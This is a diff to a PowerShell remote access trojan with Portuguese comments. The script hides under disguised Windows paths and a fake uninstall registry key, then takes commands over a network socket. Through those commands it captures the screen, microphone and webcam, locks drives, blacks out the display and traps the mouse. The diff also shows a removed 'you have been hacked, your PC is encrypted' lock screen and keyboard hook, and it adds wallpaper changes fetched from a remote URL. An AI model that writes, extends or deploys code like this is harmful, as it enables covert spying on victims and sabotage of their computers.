@@ -16,24 +16,8 @@ $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUp
 $userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
 $debugLog = "$env:TEMP\rat_debug.log"
 $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
-$wallpaperPath = "$env:TEMP\wallpaper_hack.bmp"
-
-# ===== WALLPAPER HACKEADO =====
-$wallpaperText = @"
-VOCE FOI
-
-HACKEADO!
-
-SEU PC TA
-
-CRIPTOGRAFADO!
-
-CRYPTO-LOCKED
-
-ANLGUUR
-
-NOTTI GANG
-"@
+$wallpaperPath = "$env:TEMP\wallpaper_downloaded.bmp"
+$tempImagePath = "$env:TEMP\wallpaper_temp.jpg"
 
 # ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
@@ -191,80 +175,39 @@ if (-not (Test-Path $scriptPath)) {
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# ===== CAPTURA DE TELA =====
-function Get-ScreenCapture {
+# ===== FUNÇÃO PARA BAIXAR IMAGEM DA INTERNET =====
+function Download-Image {
+    param([string]$ImageUrl)
+    
     try {
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-        $ms = New-Object System.IO.MemoryStream
-        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        $graphics.Dispose()
-        $bitmap.Dispose()
-        $base64 = [Convert]::ToBase64String($ms.ToArray())
-        $ms.Dispose()
-        Write-DebugLog "Screenshot capturado"
-        return "SCREEN:$base64"
+        Write-DebugLog "Baixando imagem de: $ImageUrl"
+        
+        # Baixar imagem
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($ImageUrl, $tempImagePath)
+        $webClient.Dispose()
+        
+        Write-DebugLog "Imagem baixada para: $tempImagePath"
+        
+        # Converter para BMP se necessário
+        if (Test-Path $tempImagePath) {
+            try {
+                $img = [System.Drawing.Image]::FromFile($tempImagePath)
+                $img.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
+                $img.Dispose()
+                
+                Remove-Item $tempImagePath -Force
+                Write-DebugLog "Imagem convertida para BMP: $wallpaperPath"
+                return $true
+            } catch {
+                Write-DebugLog "Erro ao converter imagem: $_"
+                return $false
+            }
+        }
+        
+        return $false
     } catch {
-        Write-DebugLog "Erro ao capturar screenshot: $_"
-        return "SCREEN_ERROR"
-    }
-}
-
-# ===== FUNÇÃO PARA CRIAR WALLPAPER HACKEADO =====
-function Create-HackWallpaper {
-    try {
-        Write-DebugLog "Criando wallpaper hackeado"
-        
-        # Dimensões
-        $width = 1920
-        $height = 1080
-        
-        # Criar bitmap
-        $bitmap = New-Object System.Drawing.Bitmap $width, $height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        
-        # Fundo preto
-        $graphics.Clear([System.Drawing.Color]::Black)
-        
-        # Configurar fonte
-        $fontGrande = New-Object System.Drawing.Font("Arial Black", 48, [System.Drawing.FontStyle]::Bold)
-        $fontMedio = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
-        $fontPequeno = New-Object System.Drawing.Font("Arial", 28, [System.Drawing.FontStyle]::Bold)
-        
-        $brushVermelho = [System.Drawing.Brushes]::Red
-        $brushBranco = [System.Drawing.Brushes]::White
-        $brushAmarelo = [System.Drawing.Brushes]::Orange
-        
-        # Desenhar linhas do wallpaper
-        $graphics.DrawString("VOCE FOI", $fontGrande, $brushVermelho, 200, 150)
-        $graphics.DrawString("HACKEADO!", $fontGrande, $brushVermelho, 200, 220)
-        
-        $graphics.DrawString("SEU PC TA", $fontMedio, $brushBranco, 200, 320)
-        $graphics.DrawString("CRIPTOGRAFADO!", $fontMedio, $brushBranco, 200, 390)
-        
-        $graphics.DrawString("CRYPTO-LOCKED", $fontMedio, $brushAmarelo, 200, 490)
-        
-        $graphics.DrawString("ANLGUUR", $fontPequeno, $brushBranco, 200, 590)
-        $graphics.DrawString("NOTTI GANG", $fontGrande, $brushVermelho, 200, 660)
-        
-        # Adicionar bordas decorativas
-        $pen = New-Object System.Drawing.Pen([System.Drawing.Color]::Red, 5)
-        $graphics.DrawRectangle($pen, 50, 50, $width - 100, $height - 100)
-        $pen.Width = 2
-        $pen.Color = [System.Drawing.Color]::White
-        $graphics.DrawRectangle($pen, 70, 70, $width - 140, $height - 140)
-        
-        # Salvar imagem
-        $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
-        $graphics.Dispose()
-        $bitmap.Dispose()
-        
-        Write-DebugLog "Wallpaper hackeado criado em: $wallpaperPath"
-        return $true
-    } catch {
-        Write-DebugLog "Erro ao criar wallpaper: $_"
+        Write-DebugLog "Erro ao baixar imagem: $_"
         return $false
     }
 }
@@ -297,158 +240,37 @@ public class Wallpaper {
     }
 }
 
-# ===== TELA PRETA TOTAL =====
-function Show-BlackScreen {
+# ===== FUNÇÃO PARA ALTERAR WALLPAPER POR LINK =====
+function Set-WallpaperFromUrl {
+    param([string]$ImageUrl)
+    
     try {
-        $ps = [powershell]::Create()
-        [void]$ps.AddScript({
-            Add-Type -AssemblyName System.Windows.Forms
-            Add-Type -AssemblyName System.Drawing
-            
-            $form = New-Object System.Windows.Forms.Form
-            $form.WindowState = 'Maximized'
-            $form.FormBorderStyle = 'None'
-            $form.TopMost = $true
-            $form.BackColor = 'Black'
-            $form.ControlBox = $false
-            $form.ShowInTaskbar = $false
-            $form.KeyPreview = $true
-            
-            # Bloquear todas as teclas
-            $form.Add_KeyDown({ $_.SuppressKeyPress = $true })
-            $form.Add_KeyUp({ $_.SuppressKeyPress = $true })
-            
-            $form.ShowDialog()
-        })
-        $ps.BeginInvoke()
+        Write-DebugLog "=" * 60
+        Write-DebugLog "ALTERANDO WALLPAPER VIA LINK"
+        Write-DebugLog "Link: $ImageUrl"
+        Write-DebugLog "=" * 60
         
-        Write-DebugLog "Tela preta total ativada"
-        return $true
-    } catch {
-        Write-DebugLog "Erro ao ativar tela preta: $_"
-        return $false
-    }
-}
-
-# ===== TRAVAR MOUSE =====
-$script:mouseLocked = $false
-$script:lockThread = $null
-
-function Lock-Mouse {
-    try {
-        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
-        
-        $script:mouseLocked = $true
-        
-        $script:lockThread = [System.Threading.Thread]::new({
-            while ($script:mouseLocked) {
-                try {
-                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    Start-Sleep -Milliseconds 5
-                } catch {}
+        # Baixar imagem
+        if (Download-Image -ImageUrl $ImageUrl) {
+            # Aplicar wallpaper
+            if (Set-Wallpaper) {
+                Write-DebugLog "=" * 60
+                Write-DebugLog "WALLPAPER ALTERADO COM SUCESSO"
+                Write-DebugLog "=" * 60
+                return "WALLPAPER_SET_FROM_URL"
+            } else {
+                return "WALLPAPER_APPLY_ERROR"
             }
-        })
-        $script:lockThread.IsBackground = $true
-        $script:lockThread.Start()
-        
-        return "MOUSE_LOCKED"
-    } catch {
-        return "MOUSE_LOCK_ERROR"
-    }
-}
-
-function Unlock-Mouse {
-    try {
-        $script:mouseLocked = $false
-        if ($script:lockThread -and $script:lockThread.IsAlive) {
-            $script:lockThread.Abort()
+        } else {
+            return "WALLPAPER_DOWNLOAD_ERROR"
         }
-        return "MOUSE_UNLOCKED"
     } catch {
-        return "MOUSE_UNLOCK_ERROR"
+        Write-DebugLog "ERRO ao alterar wallpaper via link: $_"
+        return "WALLPAPER_ERROR"
     }
 }
 
-# ===== BLOQUEAR TECLADO =====
-$script:keyboardHook = $null
-$script:keyboardLocked = $false
-
-function Lock-Keyboard {
-    try {
-        if ($script:keyboardLocked) { return "KEYBOARD_ALREADY_LOCKED" }
-        
-        $script:keyboardLocked = $true
-        
-        # Usar código C# para hook de teclado
-        $keyboardCode = @'
-using System;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-
-public class KeyboardLocker {
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-    private static LowLevelKeyboardProc _proc = HookCallback;
-    private static IntPtr _hookID = IntPtr.Zero;
-    private static bool _locked = false;
-    
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-    
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-    
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-    
-    public static void Lock() {
-        _locked = true;
-        using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
-        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
-            _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(curModule.ModuleName), 0);
-        }
-    }
-    
-    public static void Unlock() {
-        _locked = false;
-        if (_hookID != IntPtr.Zero) {
-            UnhookWindowsHookEx(_hookID);
-            _hookID = IntPtr.Zero;
-        }
-    }
-    
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (_locked && nCode >= 0) {
-            return (IntPtr)1; // Bloqueia a tecla
-        }
-        return CallNextHookEx(_hookID, nCode, wParam, lParam);
-    }
-}
-'@
-        Add-Type -TypeDefinition $keyboardCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
-        [KeyboardLocker]::Lock()
-        
-        return "KEYBOARD_LOCKED"
-    } catch {
-        Write-DebugLog "Erro ao bloquear teclado: $_"
-        return "KEYBOARD_ERROR"
-    }
-}
-
-function Unlock-Keyboard {
-    try {
-        [KeyboardLocker]::Unlock()
-        $script:keyboardLocked = $false
-        return "KEYBOARD_UNLOCKED"
-    } catch {
-        return "KEYBOARD_UNLOCK_ERROR"
-    }
-}
-
-# ===== FUNÇÃO LOCK TOTAL (TUDO TRAVADO + WALLPAPER) =====
+# ===== FUNÇÃO LOCK TOTAL =====
 $global:lockActive = $false
 $global:mouseLockThread = $null
 
@@ -456,26 +278,13 @@ function Activate-Lock {
     try {
         if ($global:lockActive) { return "LOCK_ALREADY_ACTIVE" }
         
-        Write-DebugLog ("=" * 60)
-        Write-DebugLog "ATIVANDO LOCK TOTAL - WALLPAPER HACKEADO + TUDO TRAVADO"
-        Write-DebugLog ("=" * 60)
+        Write-DebugLog "=" * 60
+        Write-DebugLog "ATIVANDO LOCK TOTAL"
+        Write-DebugLog "=" * 60
         
         $global:lockActive = $true
         
-        # 1. Criar wallpaper hackeado
-        Write-DebugLog "Criando wallpaper hackeado"
-        Create-HackWallpaper
-        
-        # 2. Alterar wallpaper
-        Write-DebugLog "Aplicando wallpaper"
-        Set-Wallpaper
-        
-        # 3. Ativar tela preta total
-        Write-DebugLog "Ativando tela preta"
-        Show-BlackScreen
-        
-        # 4. Travar mouse
-        Write-DebugLog "Ativando travamento de mouse"
+        # 1. Travar mouse
         $global:mouseLockThread = [System.Threading.Thread]::new({
             while ($global:lockActive) {
                 try {
@@ -487,13 +296,26 @@ function Activate-Lock {
         $global:mouseLockThread.IsBackground = $true
         $global:mouseLockThread.Start()
         
-        # 5. Bloquear teclado
-        Write-DebugLog "Ativando bloqueio de teclado"
-        Lock-Keyboard
+        # 2. Tela preta
+        $ps = [powershell]::Create()
+        [void]$ps.AddScript({
+            Add-Type -AssemblyName System.Windows.Forms
+            $form = New-Object System.Windows.Forms.Form
+            $form.WindowState = 'Maximized'
+            $form.FormBorderStyle = 'None'
+            $form.TopMost = $true
+            $form.BackColor = 'Black'
+            $form.ControlBox = $false
+            $form.ShowInTaskbar = $false
+            $form.KeyPreview = $true
+            $form.Add_KeyDown({ if ($_.KeyCode -eq 'Escape') { $form.Close() } })
+            $form.ShowDialog()
+        })
+        $ps.BeginInvoke()
         
-        Write-DebugLog ("=" * 60)
+        Write-DebugLog "=" * 60
         Write-DebugLog "LOCK TOTAL ATIVADO COM SUCESSO"
-        Write-DebugLog ("=" * 60)
+        Write-DebugLog "=" * 60
         
         return "LOCK_ACTIVATED"
     } catch {
@@ -504,56 +326,51 @@ function Activate-Lock {
 
 function Deactivate-Lock {
     try {
-        Write-DebugLog ("=" * 60)
+        Write-DebugLog "=" * 60
         Write-DebugLog "DESATIVANDO LOCK TOTAL"
-        Write-DebugLog ("=" * 60)
+        Write-DebugLog "=" * 60
         
         $global:lockActive = $false
         
-        # 1. Fechar tela preta
-        try {
-            [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
-                $_.Invoke([Action]{ $_.Close() })
-            }
-            Write-DebugLog "Tela preta fechada"
-        } catch {}
-        
-        # 2. Parar thread do mouse
-        if ($global:mouseLockThread -and $global:mouseLockThread.IsAlive) {
-            $global:mouseLockThread.Abort()
-            Write-DebugLog "Thread de mouse abortada"
+        # Fechar tela preta
+        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
+            $_.Close()
         }
         
-        # 3. Liberar teclado
-        Unlock-Keyboard
-        Write-DebugLog "Teclado liberado"
+        # Parar thread do mouse
+        if ($global:mouseLockThread -and $global:mouseLockThread.IsAlive) {
+            $global:mouseLockThread.Abort()
+        }
         
-        # 4. Restaurar wallpaper padrão
-        try {
-            $code = @'
-using System;
-using System.Runtime.InteropServices;
-public class Wallpaper {
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-    
-    public static void Set(string path) {
-        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
-    }
-}
-'@
-            Add-Type -TypeDefinition $code -ErrorAction Stop
-            [Wallpaper]::Set("")
-        } catch {}
-        
-        Write-DebugLog ("=" * 60)
+        Write-DebugLog "=" * 60
         Write-DebugLog "LOCK TOTAL DESATIVADO"
-        Write-DebugLog ("=" * 60)
+        Write-DebugLog "=" * 60
         
         return "LOCK_DEACTIVATED"
     } catch {
         Write-DebugLog "ERRO ao desativar lock total: $_"
         return "UNLOCK_ERROR"
+    }
+}
+
+# ===== CAPTURA DE TELA =====
+function Get-ScreenCapture {
+    try {
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+        $ms = New-Object System.IO.MemoryStream
+        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        $base64 = [Convert]::ToBase64String($ms.ToArray())
+        $ms.Dispose()
+        Write-DebugLog "Screenshot capturado"
+        return "SCREEN:$base64"
+    } catch {
+        Write-DebugLog "Erro ao capturar screenshot: $_"
+        return "SCREEN_ERROR"
     }
 }
 
@@ -941,14 +758,6 @@ while ($true) {
             } elseif ($cmd -eq "unlock_drives") {
                 $result = Unlock-Drives
                 $writer.WriteLine($result)
-            } elseif ($cmd -eq "lock_mouse") {
-                $result = Lock-Mouse
-                Write-DebugLog "Resultado lock_mouse: $result"
-                $writer.WriteLine($result)
-            } elseif ($cmd -eq "unlock_mouse") {
-                $result = Unlock-Mouse
-                Write-DebugLog "Resultado unlock_mouse: $result"
-                $writer.WriteLine($result)
             } elseif ($cmd -eq "mic") {
                 $writer.WriteLine((Get-Microphone))
             } elseif ($cmd -eq "webcam") {
@@ -968,6 +777,10 @@ while ($true) {
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "deactivate_lock") {
                 $result = Deactivate-Lock
+                $writer.WriteLine($result)
+            } elseif ($cmd -match "^set_wallpaper (.+)$") {
+                $url = $matches[1]
+                $result = Set-WallpaperFromUrl -ImageUrl $url
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "test") {
                 $writer.WriteLine("PONG")
@@ -1004,4 +817,3 @@ while ($true) {
 
 $mutex.ReleaseMutex()
 $mutex.Dispose()
-
